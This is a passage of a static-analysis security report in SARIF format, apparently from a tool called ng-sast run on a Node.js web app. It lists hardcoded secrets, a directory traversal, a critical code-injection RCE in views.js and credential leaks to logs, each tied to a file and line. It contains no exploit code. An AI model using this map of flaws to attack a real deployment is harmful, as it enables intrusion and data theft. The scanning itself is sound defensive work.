{
    "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
    "version": "2.1.0",
    "runs": [
        {
            "automationDetails": {
                "description": {
                    "text": "Static Analysis Security Test results using ng-sast"
                },
                "guid": "264eb0d6-8035-4693-82f3-817d06e81a8e"
            },
            "conversion": {
                "invocation": {
                    "commandLine": "",
                    "endTimeUtc": "2025-08-07T12:04:56Z",
                    "executionSuccessful": true,
                    "workingDirectory": {
                        "index": 0,
                        "uri": ""
                    }
                },
                "tool": {
                    "driver": {
                        "name": "ng-sast"
                    }
                }
            },
            "invocations": [
                {
                    "endTimeUtc": "2025-08-07T12:04:56Z",
                    "executionSuccessful": true,
                    "workingDirectory": {
                        "index": 0,
                        "uri": ""
                    }
                }
            ],
            "language": "en-US",
            "newlineSequences": [
                "\r\n",
                "\n"
            ],
            "results": [
                {
                    "fingerprints": {
                        "evidenceFingerprint": "1924c0842f506b242fb112136f228091cb3ee6696204a1f690a90a45c29a1d06"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "db-init.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 67
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/107037fa5ce21b223c6e131ef4ff15788ca6e08a2e4165adc607528789c3e5e7",
                    "ruleIndex": 0
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "80a0b3a48a3df2d0b03676f693f61aa05441efb18db47b38a745eab5334014f9"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "db-init.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 95
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/451ef41a63c648dd04d1764fbb4d03fac43287aca4b34495a8e47a4de7f79400",
                    "ruleIndex": 1
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "0181107e4e2fb2d4ad3cb993ad1d80a0794e7ee303acf95d6682ccd1b5058516"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "db-init.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 109
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/ebc2de3bd5c94b4dd9c02650aa3001f4f00f7596e97b2e8789c8bba7c7e45e61",
                    "ruleIndex": 2
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "5381ca470e837d25c00d020b317f1afdbb4d9dfa89c8ccb6666c0c4c0992e33d"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "db-init.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 123
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/6d9213d44889591971d9cc561176eafe20b509d8b16cf97b0f92e1791d01c998",
                    "ruleIndex": 3
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "59219bbb1d743f36bc675dc469d190e97c333b307dcf8fdb2e37c36eca18673b"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "db-init.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 137
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/355767e3bd64d7c0385cf5f7caa79fd79cbd7e6eb5dd9ca4b1df868564b8891c",
                    "ruleIndex": 4
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "75aed5e1d03e13353f48be887674c6495ec9011bb5d228ac949218f7f1cd7d32"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "db-init.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 151
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/16e4fe8afd8c399237f33de0a1b5f9506be326e6a04568ae67ecca4e919c34bb",
                    "ruleIndex": 5
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "cbb42c649b62036fe5c8fe200af4aea0600a43f1aa717da69a260acb9fad3048"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "db-init.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 179
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/7748cb426e974900c554439338a47602b39f275687ce5d3499705dd39be77c5b",
                    "ruleIndex": 6
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "13a0ee49d81135a8eac034b5100ed6cb60a4de2c825dfd227bb141aa31ba1b67"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "db-init.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 193
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/eb9de170ff9fef0599ea851a532b8101f1f950ef743cf8474569c265bbcc4991",
                    "ruleIndex": 7
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "f6e3694674598aa0d059d5cdd85a874a838ad45100bd881406d653d5a06e205d"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "docker-compose.yml"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 11
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/ae403034633caa3ef21d2b5fcf264c83115127d109bc9053f8a72e09eb2a2b02",
                    "ruleIndex": 8
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "6a5f2533ab116397749a8359eee4aaee75d16670852caf4e6e446b8cc66b6c63"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Order.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 58
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Hex High Entropy String",
                        "text": "Hex High Entropy String"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Hex%20High%20Entropy%20String/605b39caf08ee35056cb037ff75f954a4484a74f7b500908995d36b97cff0a0d",
                    "ruleIndex": 9
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "7e79cb8383949b801bf8de7b3bb02a15d0ec81b6cc8fa3dbeba01f0c727c1055"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Order.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 58
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/c05778eb8aa8fa46ab99433d865f3203c6db8dd8b68320419d32257e089e3417",
                    "ruleIndex": 10
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "ee68780f45c4ccf05968e9b488f9726dee0460d9f285b8457e4df772c8912306"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/DB/MongoDBClient.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 13
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/e6995b62bae3c24d9b0a768d08bf6cc3df19a93d164dd47cde4e87529f284249",
                    "ruleIndex": 11
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "4137f3257070cbe8ccf4031c5e857353641ac678b52547d4544ada30c319b579"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/server.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 12
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Secret Keyword",
                        "text": "Secret Keyword"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Secret%20Keyword/0b499b8f27a7044499835c4dd4e623299e86469b3f5cc34a1c7ac725741070ba",
                    "ruleIndex": 12
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "3217c1b3cc5991ab0ab239306b881ae45ec9655b8e624de1e03e51b7b20bf460"
                    },
                    "baselineState": "new",
                    "kind": "fail",
                    "level": "warning",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/server.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 29
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Base64 High Entropy String",
                        "text": "Base64 High Entropy String"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "medium",
                        "score": "5.5"
                    },
                    "rank": -1,
                    "ruleId": "Base64%20High%20Entropy%20String/823112a5d8f8e242ef55f44b7f79fca701419d6674be116f308e1066cb15156f",
                    "ruleIndex": 13
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "63877dc74a83a0ca599016081c1b914b74e037fe1a24c2a4bee2ae9377ef9ea6"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/ImageLookup.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 5
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/ImageLookup.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 9
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/ImageLookup.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 9
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Directory Traversal: HTTP Data as File Path via `req` in `ImageLookup.js:get`",
                        "text": "Directory Traversal: HTTP Data as File Path via req in ImageLookup.js:get"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8"
                    },
                    "rank": -1,
                    "ruleId": "arbitrary-file-read/1403735270298b846b13b9261e31cf58",
                    "ruleIndex": 14
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "be470cd5ac45480c5bbc930692c680b94cb7e8c82a87a9838ed8e12fbd994853"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/views.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 11
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/views.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 19
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/views.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 19
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Remote Code Execution: Code Injection Through Attacker-controlled Data via `req` in `views.js:<lambda>0.<lambda>3`",
                        "text": "Remote Code Execution: Code Injection Through Attacker-controlled Data via req in views.js:<lambda>0.<lambda>3"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "critical",
                        "score": "9"
                    },
                    "rank": -1,
                    "ruleId": "code-injection-attacker-controlled/8180dc380d1880be8b4c9a1a73fb1529",
                    "ruleIndex": 15
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "d35c5733a739bfb9eb1067d29cfdb9c5746fd337b70324dfc00394dd50507fe5"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 33
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 39
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 38
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 49
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "note",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Login.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 49
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Sensitive Data Leak: Security-sensitive Data is Leaked to Log in `Login.js:handleLogin`",
                        "text": "Sensitive Data Leak: Security-sensitive Data is Leaked to Log in Login.js:handleLogin"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "low",
                        "score": "3"
                    },
                    "rank": -1,
                    "ruleId": "database-to-log/94d6c9d6135654da69b2844b7b9b52dc",
                    "ruleIndex": 16
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "7622500a8f5c56b0c7e389fec4d780bc547eb92482fe96418d04656d6536c53c"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 33
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 41
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 38
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 47
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "note",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Login.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 47
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Sensitive Data Leak: Security-sensitive Data is Leaked to Log in `Login.js:handleLogin`",
                        "text": "Sensitive Data Leak: Security-sensitive Data is Leaked to Log in Login.js:handleLogin"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "low",
                        "score": "3"
                    },
                    "rank": -1,
                    "ruleId": "database-to-log/94d6c9d6135654da69b2844b7b9b52dc",
                    "ruleIndex": 16
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "ff5e734952cdaf837cd0bbdacef7145f252f2325bef399b68edc861ddb8b87db"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Integrations/Mail.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 8
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Integrations/Mail.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 20
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Integrations/Mail.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 20
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Sensitive Data Leak: Sensitive Data is Leaked via `username` to Log in `Mail.js:<init>`",
                        "text": "Sensitive Data Leak: Sensitive Data is Leaked via username to Log in Mail.js:<init>"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8"
                    },
                    "rank": -1,
                    "ruleId": "sensitive-to-log/5282b69472fced914b936043c87fd20e",
                    "ruleIndex": 17
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "5eaff19f5d7004b95bdff6c888dc8bb2032622442d4e092ea61ee353334e0612"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 80
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 81
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 82
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Login.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 82
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Sensitive Data Leak: Sensitive Data is Leaked to Log in `Login.js:login`",
                        "text": "Sensitive Data Leak: Sensitive Data is Leaked to Log in Login.js:login"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8"
                    },
                    "rank": -1,
                    "ruleId": "sensitive-to-log/217679579f7afe20ba8bcab68d8f8693",
                    "ruleIndex": 18
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "f994a0a8111a9e1d5120d28e6bbdfa268ed503eade256e1456c8a32492a4e42a"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 38
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 49
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Login.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 49
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Sensitive Data Leak: Sensitive Data is Leaked to Log in `Login.js:handleLogin`",
                        "text": "Sensitive Data Leak: Sensitive Data is Leaked to Log in Login.js:handleLogin"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8"
                    },
                    "rank": -1,
                    "ruleId": "sensitive-to-log/4edeaecd19b62a73663b81f4faf9302d",
                    "ruleIndex": 19
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "8fb46f1af29e7490524a59bf3d335feb18483f097f93cd9d06a9dbf877614ca6"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
